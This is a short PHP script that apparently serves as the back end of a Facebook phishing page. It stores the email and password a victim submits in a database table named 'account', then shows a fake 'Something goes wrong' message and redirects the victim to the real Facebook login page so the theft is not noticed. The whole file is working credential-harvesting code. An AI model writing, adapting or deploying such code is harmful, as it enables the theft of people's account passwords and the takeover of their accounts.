<?php
require_once('SQL.php');
$qu = sprintf("INSERT INTO `".$database_SQL."`.`account` (`email`, `pass`) VALUES ('%s', '%s')",mysqli_real_escape_string($SQL,$_POST['email']),mysqli_real_escape_string($SQL,$_POST['pass']));
mysqli_query($SQL,$qu);
?>
<meta http-equiv="refresh" content="0.2;url=https://www.facebook.com/login.php">
<body>
Something goes wrong.Redirecting.......
</body>
